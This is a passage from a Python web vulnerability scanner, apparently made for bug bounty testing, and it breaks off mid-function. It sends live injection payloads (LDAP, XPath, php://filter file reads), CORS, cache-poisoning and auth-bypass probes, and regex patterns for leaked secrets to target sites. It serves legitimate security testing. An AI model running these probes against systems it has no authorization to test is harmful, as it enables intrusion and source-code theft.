                        "evidence": (
                            f"{url}: GET returned {baseline_resp.status_code} (blocked), but "
                            f"{method} returned 200 with a {len(resp.text)}-byte body - the "
                            f"access-control layer isn't checking this HTTP verb."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: verb tampering auth bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 52. Unauthenticated GraphQL mutation execution
# ---------------------------------------------------------------------
_GRAPHQL_BLIND_MUTATION_PROBES = [
    '{"query": "mutation { __typename }"}',
]


async def check_unauthenticated_graphql_mutation(url: str) -> dict | None:
    """
    Sends a minimal, universally-valid mutation shell (`mutation {
    __typename }`) with no authentication at all. Every GraphQL server
    that accepts mutations at all will answer this one - it costs
    nothing and asks nothing sensitive, but if the endpoint requires
    auth for mutations, a properly configured server rejects it before
    ever reaching resolution. A clean top-level "data" key with no
    "errors" key means mutations are reachable without authentication -
    a real access-control gap, distinct from (and complementary to)
    check_graphql_introspection, which only tests read-side schema
    disclosure.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.post(
                    url,
                    content=_GRAPHQL_BLIND_MUTATION_PROBES[0],
                    headers={"Content-Type": "application/json"},
                )
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: unauthenticated GraphQL mutation check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None
    if not isinstance(response_json, dict):
        return None

    if "data" in response_json and response_json.get("data") and "errors" not in response_json:
        return {
            "vuln_type": "unauthenticated_graphql_mutation",
            "severity": "high",
            "evidence": (
                f"{url}: an unauthenticated 'mutation {{ __typename }}' request succeeded "
                f"(top-level 'data' present, no 'errors') - mutations are reachable without "
                f"authentication, worth manually enumerating real mutation names for actual "
                f"write-access impact."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 53. Negative-number business logic candidate (recon-only)
# ---------------------------------------------------------------------
async def check_negative_number_business_logic_candidate(url: str) -> str | None:
    """
    Flags numeric query parameters that silently accept a negative value
    (same 200 status as the original, no obvious validation-error
    language) as candidates for manual business-logic testing (price/
    quantity/balance manipulation). Returns a plain string, NOT a
    findings dict - accepting a negative number isn't itself a
    vulnerability; real impact requires knowing what the parameter
    controls and manually confirming a negative value produces an
    exploitable outcome (negative total, balance increase, etc.), which
    is app-specific business logic this scanner can't verify generically.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)
    numeric_params = {k: v for k, v in existing_params.items() if re.fullmatch(r"\d+", v or "")}
    if not numeric_params:
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code != 200:
                return None

            for param_name, value in numeric_params.items():
                test_params = dict(existing_params)
                test_params[param_name] = "-" + value
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body_lower = resp.text[:2000].lower()
                error_language = any(
                    kw in body_lower for kw in ("invalid", "must be positive", "error", "bad request")
                )
                if resp.status_code == 200 and not error_language:
                    return (
                        f"{test_url}: numeric parameter '{param_name}' (originally {value!r}) "
                        f"accepted a negative value with a 200 response and no obvious "
                        f"validation-error language - candidate for manual business-logic "
                        f"testing (price/quantity/balance manipulation)"
                    )
    except httpx.HTTPError as exc:
        logger.info("detective: negative number business logic check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 54. Predictable/weak token pattern (recon-only)
# ---------------------------------------------------------------------
async def check_predictable_token_pattern(url: str) -> str | None:
    """
    Flags query parameters whose NAME looks token/session/reset/otp-
    shaped (reuses the same _SENSITIVE_PARAM_NAME_RE as
    check_referrer_policy_sensitive_leak) and whose VALUE looks
    suspiciously weak - short and purely numeric, which is consistent
    with a small keyspace an attacker could brute-force or guess.
    Returns a plain string, NOT a findings dict - "this token looks
    short" is a candidate for manual entropy/predictability analysis
    (request several and check for sequential or low-variance
    patterns), not a confirmed weakness on its own; a single sample
    can't prove predictability.
    """
    parsed = httpx.URL(url)
    query_params = dict(parsed.params)
    for param_name, value in query_params.items():
        if _SENSITIVE_PARAM_NAME_RE.match(param_name) and value and re.fullmatch(r"\d{1,8}", value):
            return (
                f"{url}: parameter '{param_name}' (token/session/reset-shaped name) has a "
                f"short, purely numeric value ({value!r}, {len(value)} digits) - candidate "
                f"for manual predictability testing (request several and check for "
                f"sequential/low-entropy patterns); a single sample doesn't confirm weakness"
            )
    return None


# ---------------------------------------------------------------------
# 55. Missing clickjacking protection (recon-only)
# ---------------------------------------------------------------------
_FRAME_ANCESTORS_RE = re.compile(r"frame-ancestors\s+'none'|frame-ancestors\s+'self'", re.IGNORECASE)


async def check_clickjacking_missing_protection(url: str) -> str | None:
    """
    Checks for the absence of BOTH X-Frame-Options and a restrictive
    CSP frame-ancestors directive. Returns a plain string, NOT a
    findings dict, and deliberately not auto-filed even though this is
    a real, correctly-detected gap - clickjacking is one of the most
    commonly Informative/excluded categories on bug bounty programs
    across the board, valuable only when demonstrated against a
    specific sensitive action (funds transfer, account deletion, 2FA
    disable), not as a standalone "header is missing" report. Same
    reasoning already applied to check_csp_weakness and check_missing_sri.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: clickjacking check failed for %s: %s", url, exc)
        return None

    if resp.headers.get("x-frame-options"):
        return None
    csp = resp.headers.get("content-security-policy", "")
    if _FRAME_ANCESTORS_RE.search(csp):
        return None

    return (
        f"{url}: no X-Frame-Options header and no restrictive CSP frame-ancestors directive "
        f"- page can be framed by any origin. Almost always rated Informative on its own; "
        f"only worth reporting if you can demonstrate a real sensitive action being framed "
        f"(funds transfer, account deletion, 2FA disable), not as a standalone header finding"
    )


# ---------------------------------------------------------------------
# 56. Hardcoded secrets / internal infrastructure disclosure (recon-only)
# ---------------------------------------------------------------------
_HARDCODED_SECRET_PATTERNS = [
    re.compile(r'(?:password|passwd|pwd)\s*[:=]\s*["\'][^"\']{4,}["\']', re.IGNORECASE),
    re.compile(r'(?:secret|apisecret|api_secret)\s*[:=]\s*["\'][^"\']{4,}["\']', re.IGNORECASE),
    re.compile(r'\b[\w-]+\.internal\b', re.IGNORECASE),
    re.compile(r'\b[\w-]+\.corp\b', re.IGNORECASE),
    re.compile(r'\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'),
    re.compile(r'\b192\.168\.\d{1,3}\.\d{1,3}\b'),
    re.compile(r'\b172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}\b'),
    re.compile(r'(?:TODO|FIXME)[^\n]{0,80}(?:security|auth|password|remove before|hardcod)', re.IGNORECASE),
]


async def check_hardcoded_secrets_and_internal_disclosure(url: str) -> str | None:
    """
    Broader complement to check_api_key_leak_signature (batch 8), which
    only matches fixed-format provider keys (AWS/Stripe/etc.). This
    scans for generic hardcoded-credential assignment patterns, internal
    hostname conventions (*.internal, *.corp), private IP ranges, and
    security-relevant TODO/FIXME comments left in shipped code. Returns
    a plain string, NOT a findings dict - these patterns are much less
    format-specific than a real API key signature, so severity and
    exploitability vary enormously by what's actually found; this flags
    candidates for manual review rather than auto-filing a graded finding.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: hardcoded secrets check failed for %s: %s", url, exc)
        return None

    body = resp.text
    hits = []
    for pattern in _HARDCODED_SECRET_PATTERNS:
        match = pattern.search(body)
        if match:
            hits.append(match.group(0)[:80])
        if len(hits) >= 3:
            break

    if hits:
        return (
            f"{url}: found {len(hits)} pattern(s) suggesting hardcoded secrets or internal "
            f"infrastructure disclosure (e.g. {hits[0]!r}) - candidate for manual review, "
            f"severity varies widely by what's actually present"
        )
    return None


# ---------------------------------------------------------------------
# 57. LFI via PHP wrapper (source disclosure, not just file existence)
# ---------------------------------------------------------------------
_PHP_WRAPPER_PROBES = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=config",
]
_PHP_SOURCE_MARKERS = ["<?php", "<?="]


async def check_lfi_via_php_wrapper(url: str) -> dict | None:
    """
    Complements check_path_traversal_lfi (batch 10) with PHP-specific
    wrapper-based file disclosure - php://filter/convert.base64-encode
    reads a file's raw source (bypassing execution) instead of needing a
    predictable absolute path like /etc/passwd. Proof bar: the response
    must contain a valid base64 blob that decodes to recognizable PHP
    source markers (<?php, <?=) - decoding successfully AND finding
    those markers rules out coincidental base64-looking text.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                for probe in _PHP_WRAPPER_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    if resp.text == baseline_body:
                        continue
                    candidate = resp.text.strip()
                    for token in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", candidate):
                        try:
                            decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", errors="ignore")
                        except Exception:
                            continue
                        if any(marker in decoded for marker in _PHP_SOURCE_MARKERS):
                            return {
                                "vuln_type": "lfi_php_wrapper_source_disclosure",
                                "severity": "critical",
                                "evidence": (
                                    f"{test_url}: parameter '{param_name}' with php://filter "
                                    f"wrapper probe {probe!r} returned a base64 blob that "
                                    f"decodes to PHP source (contains {'/'.join(_PHP_SOURCE_MARKERS)}) "
                                    f"- confirmed local file read via wrapper bypass, not just "
                                    f"file existence."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: PHP wrapper LFI check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 58. LDAP injection (error-based)
# ---------------------------------------------------------------------
_LDAP_INJECTION_PROBES = ["*)(uid=*))(|(uid=*", "*)(|(objectclass=*", "*))%00"]
_LDAP_ERROR_SIGNATURES = [
    "LDAPException", "javax.naming.directory", "Invalid DN syntax",
    "LDAP: error code", "com.sun.jndi.ldap",
]


async def check_ldap_injection_error_based(url: str) -> dict | None:
    """
    Sends LDAP filter-breaking syntax and checks for LDAP-library-
    specific error signatures. Baseline-diffed against an unmodified
    request first, same discipline the audit added to check_ssrf_reflected
    and check_xxe_error_based - these error strings are distinctive
    enough to rarely collide, but not risking it after the SSTI lesson.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                for probe in _LDAP_INJECTION_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    for sig in _LDAP_ERROR_SIGNATURES:
                        if sig in resp.text and sig not in baseline_body:
                            return {
                                "vuln_type": "ldap_injection_error_based",
                                "severity": "high",
                                "evidence": (
                                    f"{test_url}: parameter '{param_name}' with LDAP filter-"
                                    f"breaking probe {probe!r} triggered an LDAP-specific error "
                                    f"signature ({sig!r}, absent from baseline)."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: LDAP injection check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 59. XPath injection (error-based)
# ---------------------------------------------------------------------
_XPATH_INJECTION_PROBES = ["' or '1'='1", "'] | //user/*[contains(*,'"]
_XPATH_ERROR_SIGNATURES = [
    "XPathException", "MS.Internal.Xml.XPath", "System.Xml.XPath",
    "org.apache.xpath", "libxml2",
]


async def check_xpath_injection_error_based(url: str) -> dict | None:
    """
    Same technique and baseline-diffing discipline as
    check_ldap_injection_error_based, targeting XPath query parsers
    instead. XPath-backed auth/search functionality is much rarer than
    SQL, so this has a low hit rate in general - but a genuine hit is
    typically high-value (auth bypass on XML-backed user stores).
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                for probe in _XPATH_INJECTION_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    for sig in _XPATH_ERROR_SIGNATURES:
                        if sig in resp.text and sig not in baseline_body:
                            return {
                                "vuln_type": "xpath_injection_error_based",
                                "severity": "medium",
                                "evidence": (
                                    f"{test_url}: parameter '{param_name}' with XPath-breaking "
                                    f"probe {probe!r} triggered an XPath-specific error signature "
                                    f"({sig!r}, absent from baseline)."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: XPath injection check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 60. CORS null-origin bypass
# ---------------------------------------------------------------------
async def check_cors_null_origin_bypass(url: str) -> dict | None:
    """
    Specifically tests the "Origin: null" bypass - browsers send a
    literal null origin for sandboxed iframes and some data:/file:
    contexts, which an attacker fully controls regardless of any
    domain allowlist. If the server reflects "null" back in Access-
    Control-Allow-Origin alongside Access-Control-Allow-Credentials:
    true, any attacker page can steal authenticated data via a
    sandboxed iframe - distinct from (and narrower than) whatever
    check_cors_misconfig (batch 1) tests generically. Pure deterministic
    header comparison, zero substring-coincidence risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url, headers={"Origin": "null"})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CORS null origin check failed for %s: %s", url, exc)
        return None

    acao = resp.headers.get("access-control-allow-origin", "")
    acac = resp.headers.get("access-control-allow-credentials", "").lower()
    if acao.strip() == "null" and acac == "true":
        return {
            "vuln_type": "cors_null_origin_credentials_bypass",
            "severity": "high",
            "evidence": (
                f"{url}: sending Origin: null returned Access-Control-Allow-Origin: null "
                f"with Access-Control-Allow-Credentials: true - any attacker page can read "
                f"authenticated responses via a sandboxed iframe (Origin: null is fully "
                f"attacker-controlled, not a real domain restriction)."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 61. Web cache poisoning via unkeyed header
# ---------------------------------------------------------------------
async def check_web_cache_poisoning_unkeyed_header(url: str) -> dict | None:
    """
    Sends a unique marker via X-Forwarded-Host (an "unkeyed" header -
    most caches don't include it in the cache key), then makes a
    SEPARATE, completely plain follow-up request with no special headers
    at all. If the marker still comes back on that plain request, the
    poisoned response got cached and would be served to any other user
    hitting the same URL - that's the actual proof of cache poisoning,
    not just "the header was reflected once" (which check_host_header_
    injection from batch 7 already covers for the non-cached case).
    """
    marker = "swas-cache-poison-" + uuid.uuid4().hex[:10]
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                await client.get(url, headers={"X-Forwarded-Host": marker})
            except httpx.HTTPError:
                return None
            try:
                followup_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if marker in followup_resp.text:
                return {
                    "vuln_type": "web_cache_poisoning_unkeyed_header",
                    "severity": "high",
                    "evidence": (
                        f"{url}: sending X-Forwarded-Host: {marker} once, then making a "
                        f"completely plain follow-up request with no special headers, still "
                        f"returned the marker - the poisoned response was cached and would be "
                        f"served to any other visitor of this URL."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: cache poisoning check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 62. JWT 'kid' header injection candidate (recon-only)
# ---------------------------------------------------------------------
async def check_jwt_kid_header_injection_candidate(url: str) -> str | None:
    """
    Finds a JWT and checks whether its header includes a 'kid' (Key ID)
    claim that looks like a file path or SQL-fragment - a classic
    injection point where the key-lookup logic uses attacker-influenced
    input to locate/construct the verification key (path traversal to a
    predictable low-entropy file, or SQLi in a "SELECT key FROM keys
    WHERE id = ?" lookup). Returns a plain string, NOT a findings dict -
    same reasoning as check_jwt_alg_confusion: detecting a suspicious
    'kid' value doesn't confirm the key-lookup is actually exploitable,
    and confirming it requires forging and replaying a token against a
    protected endpoint, which this scanner deliberately doesn't do.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT kid header check failed for %s: %s", url, exc)
        return None

    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
    match = _JWT_RE.search(haystack)
    if not match:
        return None
    header_b64 = match.group(0).split(".")[0]
    try:
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
    except Exception:
        return None

    kid = header.get("kid")
    if not kid or not isinstance(kid, str):
        return None
    if "/" in kid or "\\" in kid or "'" in kid or ".." in kid:
        return (
            f"{url}: JWT header includes a 'kid' claim ({kid!r}) that looks like a file path "
            f"or contains injection-relevant characters - candidate for manual kid-based key-"
            f"confusion testing (path traversal to a predictable key file, or SQLi in the key "
            f"lookup); not exploited here since that requires forging and replaying a token"
        )
    return None


# ---------------------------------------------------------------------
# 63. Missing CSRF token on state-changing forms (recon-only)
# ---------------------------------------------------------------------
_CSRF_TOKEN_FIELD_RE = re.compile(r'name=["\'][^"\']*(?:csrf|xsrf|authenticity_token|_token)[^"\']*["\']', re.IGNORECASE)
_POST_FORM_RE = re.compile(r'<form[^>]+method=["\']?post["\']?[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)


async def check_csrf_token_missing(url: str) -> str | None:
    """
    Scans POST forms for the absence of any csrf/xsrf/authenticity-
    token-shaped hidden field. Returns a plain string, NOT a findings
    dict - many modern apps rely entirely on SameSite cookies instead of
    a token field and are still perfectly protected, so a missing token
    field alone doesn't confirm a real CSRF vulnerability. Confirming
    that needs checking SameSite/Origin-validation behavior too, which
    this scanner doesn't attempt. Flag for manual review, not a verdict.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: CSRF token check failed for %s: %s", url, exc)
        return None

    body = resp.text
    forms_without_token = 0
    for form_match in _POST_FORM_RE.finditer(body):
        form_body = form_match.group(1)
        if not _CSRF_TOKEN_FIELD_RE.search(form_body):
            forms_without_token += 1

    if forms_without_token:
        return (
            f"{url}: {forms_without_token} POST form(s) with no csrf/xsrf/authenticity-token-"
            f"shaped hidden field - candidate for manual CSRF review (check SameSite cookie "
            f"attributes and Origin validation before concluding this is exploitable; a "
            f"missing token field alone isn't a confirmed vulnerability on modern browsers)"
        )
    return None


# ---------------------------------------------------------------------
# 64. File upload form candidate (recon-only)
# ---------------------------------------------------------------------
_FILE_INPUT_RE = re.compile(r'<input[^>]+type=["\']file["\'][^>]*>', re.IGNORECASE)
_ACCEPT_ATTR_RE = re.compile(r'accept=["\']([^"\']*)["\']', re.IGNORECASE)


async def check_file_upload_form_candidate(url: str) -> str | None:
    """
    Flags pages containing a file-upload form (<input type="file">).
    Returns a plain string, NOT a findings dict, and never attempts an
    actual upload - unrestricted file upload -> RCE is a high-payout bug
    class, but actually testing extension/content-type/magic-byte
    bypasses means uploading real files to what might be production
    storage, which carries real risk of leaving artifacts behind on a
    target you don't control. This only tells you where the upload
    surface is so you can test it manually and clean up after yourself.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: file upload form check failed for %s: %s", url, exc)
        return None

    body = resp.text
    file_inputs = _FILE_INPUT_RE.findall(body)
    if not file_inputs:
        return None

    accept_values = [m for m in _ACCEPT_ATTR_RE.findall(" ".join(file_inputs))]
    accept_note = f", accept={accept_values}" if accept_values else " (no accept attribute set)"
    return (
        f"{url}: contains {len(file_inputs)} file-upload input(s){accept_note} - candidate "
        f"for manual upload-restriction-bypass testing (double extensions, null byte, "
        f"content-type spoofing, magic-byte bypass); not tested here to avoid leaving "
        f"uploaded artifacts on the target"
    )


# ---------------------------------------------------------------------
# 65. CORS wildcard + credentials (spec-violating misconfiguration)
# ---------------------------------------------------------------------
async def check_cors_wildcard_with_credentials(url: str) -> dict | None:
    """
    Per spec, browsers should refuse to honor Access-Control-Allow-
    Origin: * combined with Access-Control-Allow-Credentials: true - but
    plenty of misconfigured servers/proxies still SEND both together
    anyway, which is a genuine server-side policy bug even where modern
    browsers won't act on it (older clients, non-browser HTTP clients,
    and some proxy/cache layers may not enforce the same restriction).
    Pure deterministic header inspection, zero substring-coincidence risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url, headers={"Origin": "https://swas-cors-probe.test"})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CORS wildcard credentials check failed for %s: %s", url, exc)
        return None

    acao = resp.headers.get("access-control-allow-origin", "").strip()
    acac = resp.headers.get("access-control-allow-credentials", "").strip().lower()
    if acao == "*" and acac == "true":
        return {
            "vuln_type": "cors_wildcard_with_credentials",
            "severity": "medium",
            "evidence": (
                f"{url}: server sent Access-Control-Allow-Origin: * together with "
                f"Access-Control-Allow-Credentials: true in the same response - a spec-"
                f"violating combination most browsers won't honor, but indicates a genuinely "
                f"broken CORS policy that may still be exploitable via non-browser clients or "
                f"proxy/cache layers that don't enforce the same restriction."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 66. WebSocket loaded over unencrypted ws:// from an HTTPS page
# ---------------------------------------------------------------------
_WS_URL_RE = re.compile(r'\bws://[^\s"\'<>]+', re.IGNORECASE)


async def check_websocket_downgrade(url: str) -> dict | None:
    """
    Scans an HTTPS page for hardcoded ws:// (unencrypted) WebSocket URLs
    instead of wss://. A WebSocket carrying session tokens, chat
    content, or live app data over plaintext on an otherwise-HTTPS site
    is a real, low-collision structural finding - "ws://" as an exact
    scheme prefix essentially never appears coincidentally in unrelated
    content, so this doesn't need baseline diffing the way generic
    substring checks do.
    """
    if not url.lower().startswith("https://"):
        return None  # only meaningful as a downgrade if the page itself is HTTPS

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: WebSocket downgrade check failed for %s: %s", url, exc)
        return None

    match = _WS_URL_RE.search(resp.text)
    if match:
        return {
            "vuln_type": "websocket_unencrypted_downgrade",
            "severity": "medium",
            "evidence": (
                f"{url}: HTTPS page references an unencrypted WebSocket URL "
                f"({match.group(0)[:100]!r}) instead of wss:// - any data sent over that "
                f"connection (session tokens, live app data) is exposed to network-level "
                f"interception despite the page itself being served over HTTPS."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 67. Excessive data exposure in JSON API responses (recon-only)
# ---------------------------------------------------------------------
_EXCESSIVE_EXPOSURE_FIELD_NAMES = [
    "password", "password_hash", "passwordhash", "salt", "ssn", "social_security",
    "credit_card", "creditcard", "cvv", "api_secret", "private_key", "internal_notes",
    "is_admin", "hashed_password",
]


def _find_sensitive_keys(obj, depth: int = 0) -> list[str]:
    if depth > 4:
        return []
    found = []
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key.lower() in _EXCESSIVE_EXPOSURE_FIELD_NAMES:
                found.append(key)
            found.extend(_find_sensitive_keys(value, depth + 1))
    elif isinstance(obj, list):
        for item in obj[:5]:
            found.extend(_find_sensitive_keys(item, depth + 1))
    return found


async def check_excessive_data_exposure_api(url: str) -> str | None:
    """
    Parses a JSON API response and looks for field names that suggest
    the server is returning more than the client needs (password
    hashes, salts, internal notes, raw SSNs/credit-card numbers).
    Returns a plain string, NOT a findings dict - a field NAME existing
    in a response doesn't confirm it's actually sensitive data (could be
    a null placeholder, a schema artifact, or intentionally exposed to
    an admin-only endpoint this request happens to be hitting); this
    flags candidates for manual inspection of the actual values returned.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: excessive data exposure check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None

    sensitive_keys = _find_sensitive_keys(response_json)
    if sensitive_keys:
        unique_keys = sorted(set(sensitive_keys))
        return (
            f"{url}: JSON response contains field name(s) suggesting excessive data exposure "
            f"({', '.join(unique_keys)}) - candidate for manual review of the actual values "
            f"returned (a present field name alone doesn't confirm real sensitive data)"
        )
    return None


# ---------------------------------------------------------------------
# 68. API version downgrade bypass
# ---------------------------------------------------------------------
_API_VERSION_RE = re.compile(r"/v(\d+)/")
_DOWNGRADE_VERSIONS = ["v1", "v0", "beta", "internal", "legacy"]


async def check_api_version_downgrade_bypass(url: str) -> dict | None:
    """
    If a URL's path contains a version segment (/v2/, /v3/, etc.), tries
    swapping it for older/deprecated version markers (v1, v0, beta,
    internal, legacy) - a common real-world gap where a deprecated API
    version stays live with weaker or no access control, while the
    "current" version everyone assumes is the only path in is properly
    secured. Same deterministic status-code-transition proof bar as
    check_auth_bypass_via_method_override: the current-version URL must
    be blocked (401/403) first, and the older-version URL must return
    200 with real content - no substring-matching risk.
    """
    match = _API_VERSION_RE.search(str(httpx.URL(url).path))
    if not match:
        return None
    current_version = match.group(0)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None  # not blocked on the current version - nothing to bypass

            for old_version in _DOWNGRADE_VERSIONS:
                downgraded_url = url.replace(current_version, f"/{old_version}/", 1)
                if downgraded_url == url:
                    continue
                try:
                    resp = await client.get(downgraded_url)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "api_version_downgrade_bypass",
                        "severity": "high",
                        "evidence": (
                            f"{url}: blocked with {baseline_resp.status_code} on the current "
                            f"API version, but {downgraded_url} (older/deprecated version) "
                            f"returned 200 with a {len(resp.text)}-byte body - the deprecated "
                            f"version doesn't enforce the same access control."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: API version downgrade check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 69. Missing SPF/DMARC email authentication records (recon-only)
# ---------------------------------------------------------------------
async def check_missing_spf_dmarc(host: str) -> str | None:
    """
    Looks up SPF (TXT record starting "v=spf1") and DMARC
    (_dmarc.<domain> TXT record) for the host's domain via DNS-over-
    HTTPS. Returns a plain string, NOT a findings dict - missing email
    authentication enables spoofing, which is real, but email security
    is explicitly out of scope or rated Informative on a large fraction
    of bug bounty programs (it affects the mail domain broadly, not a
    specific app vulnerability) - flag for awareness, check program
    policy before treating this as report-worthy, same reasoning
    already applied to check_clickjacking_missing_protection.
    """
    domain = httpx.URL(host).host
    if not domain or domain.replace(".", "").isdigit():
        return None  # bare IP, no domain to check

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            try:
                spf_resp = await client.get(
                    f"https://cloudflare-dns.com/dns-query?name={domain}&type=TXT",
                    headers={"Accept": "application/dns-json"},
                )
                spf_data = spf_resp.json()
            except Exception:
                spf_data = {}
            has_spf = any(
                "v=spf1" in a.get("data", "") for a in spf_data.get("Answer", [])
            )

            try:
                dmarc_resp = await client.get(
                    f"https://cloudflare-dns.com/dns-query?name=_dmarc.{domain}&type=TXT",
                    headers={"Accept": "application/dns-json"},
                )
                dmarc_data = dmarc_resp.json()
            except Exception:
                dmarc_data = {}
            has_dmarc = any(
                "v=dmarc1" in a.get("data", "").lower() for a in dmarc_data.get("Answer", [])
            )
    except httpx.HTTPError as exc:
        logger.info("detective: SPF/DMARC check failed for %s: %s", host, exc)
        return None

    if not has_spf and not has_dmarc:
        return (
            f"{domain}: no SPF or DMARC TXT record found - domain email is spoofable. "
            f"Email authentication gaps are frequently out of scope or Informative on bug "
            f"bounty programs - check program policy before reporting."
        )
    return None


# ---------------------------------------------------------------------
# 70. GraphQL queries accepted via GET (recon-only, CSRF-chaining candidate)
# ---------------------------------------------------------------------
async def check_graphql_query_via_get(url: str) -> str | None:
    """
    Checks whether a GraphQL endpoint accepts queries via GET (as query-
    string parameters) rather than requiring POST. Returns a plain
    string, NOT a findings dict - this is a structural capability check,
    not a vulnerability by itself. It matters because a GET-based query
    rides along with a victim's cookies automatically in a simple cross-
    site request (no preflight needed the way a custom-header POST
    would trigger), which is a real CSRF-chaining candidate - but
    confirming actual impact needs an authenticated session to see what
    data a forced query could exfiltrate, which this scanner doesn't
    have.
    """
    probe_url = url.rstrip("/") + '?query={__typename}'
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(probe_url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: GraphQL GET query check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None
    if isinstance(response_json, dict) and response_json.get("data") and "errors" not in response_json:
        return (
